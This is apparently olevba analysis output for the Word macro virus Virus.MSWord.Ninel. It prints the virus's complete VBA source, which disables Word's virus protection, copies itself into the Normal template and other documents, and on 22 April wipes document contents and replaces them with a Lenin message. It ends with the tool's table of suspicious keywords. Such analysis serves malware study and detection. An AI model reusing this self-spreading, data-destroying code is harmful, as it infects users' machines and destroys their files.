olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Ninel
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Ninel - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO leninalive.bas 
in file: ./Virus.MSWord.Ninel - OLE stream: 'Macros/VBA/leninalive'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.autoopen.autoopen"
If Date = "22.04.2001" Or Date = "22.04.2002" Or Date = "22.04.2003" _
Or Date = "22.04.2004" Or Date = "22.04.2005" Or Date = "22.04.2006" _
Or Date = "22.04.2007" Or Date = "22.04.2008" Or Date = "22.04.2009" Then
 Assistant.Visible = True
With Assistant.NewBalloon
   .Button = msoButtonSetOK
  .Heading = "22 Àïðåëÿ"
 .Text = "Ñ äí¸ì ðîæäåíèÿ, Âëàäèìèð Èëüè÷ Ëåíèí !!!"
.Show
End With
End If
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
 RecentFiles.Maximum = 0
On Error GoTo ErrorAO
iMacroCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "leninalive" Then
        myflag = -1
    End If
Next i
If Not myflag Then

Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name _
        :="leninalive", Object:=wdOrganizerObjectProjectItems
End If
k = ActiveDocument.FullName
iMacroCount = Application.ActiveDocument.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If Application.ActiveDocument.VBProject.VBComponents(i).Name = "leninalive" Then
ActiveDocument.SaveAs FileName:="c:\program files\lenin.dot", FileFormat:=wdFormatTemplate
ActiveDocument.SaveAs FileName:=k
End If
Next i
Application.ActiveDocument.Save
Application.OrganizerCopy Source:="c:\program files\lenin.dot", Destination:=ActiveDocument.FullName, Name _
        :="leninalive", Object:=wdOrganizerObjectProjectItems
Application.ActiveDocument.Save
ErrorAO:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
Assistant.Visible = True
With Assistant.NewBalloon
    .Button = msoButtonSetOK
    .Heading = "22 Àïðåëÿ"
    .Text = "Äåíü ðîæäåíèÿ Âëàäèìèðà Èëüè÷à Ëåíèíà !!!"
    .Show
End With
ErrorVVBC:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
Assistant.Visible = True
With Assistant.NewBalloon
    .Button = msoButtonSetOK
    .Heading = "22 Àïðåëÿ"
    .Text = "Äåíü ðîæäåíèÿ Âëàäèìèðà Èëüè÷à Ëåíèíà !!!"
    .Show
End With
ErrorVVBC:
End Sub
Sub FileSave()
If Date = "22.04.2001" Or Date = "22.04.2002" Or Date = "22.04.2003" _
Or Date = "22.04.2004" Or Date = "22.04.2005" Or Date = "22.04.2006" _
Or Date = "22.04.2007" Or Date = "22.04.2008" Or Date = "22.04.2009" Then
 Assistant.Visible = True
With Assistant.NewBalloon
    .Button = msoButtonSetOK
    .Heading = "22 Àïðåëÿ"
    .Text = "Ñ äí¸ì ðîæäåíèÿ, Âëàäèìèð Èëüè÷ Ëåíèí !!!"
    .Show
End With
End If
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
 RecentFiles.Maximum = 0
On Error GoTo ErrorAO
iMacroCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "leninalive" Then
        myflag = -1
    End If
Next i
If Not myflag Then

Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name _
        :="leninalive", Object:=wdOrganizerObjectProjectItems
End If
k = ActiveDocument.FullName
iMacroCount = Application.ActiveDocument.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If Application.ActiveDocument.VBProject.VBComponents(i).Name = "leninalive" Then
ActiveDocument.SaveAs FileName:="c:\program files\lenin.dot", FileFormat:=wdFormatTemplate
ActiveDocument.SaveAs FileName:=k
End If
Next i
Application.ActiveDocument.Save
Application.OrganizerCopy Source:="c:\program files\lenin.dot", Destination:=ActiveDocument.FullName, Name _
        :="leninalive", Object:=wdOrganizerObjectProjectItems
Application.ActiveDocument.Save
ErrorAO:
End Sub

Sub AutoClose()
If Date = "22.04.2001" Or Date = "22.04.2002" Or Date = "22.04.2003" _
Or Date = "22.04.2004" Or Date = "22.04.2005" Or Date = "22.04.2006" _
Or Date = "22.04.2007" Or Date = "22.04.2008" Or Date = "22.04.2009" Then
On Error GoTo ErrorAO
ActiveDocument.Save
ActiveDocument.Select
Selection.Delete
Selection.TypeText Text:="Ëåíèí âñåãäà æèâîé !!! Ñåãîäíÿ 22 àïðåëÿ - äåíü ðîæäåíèÿ Âëàäèìèðà Èëüè÷à !!! Íå çàáûâàé ýòîò äåíü!!!"
ActiveDocument.Save
ActiveDocument.Close
End If
ErrorAO:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

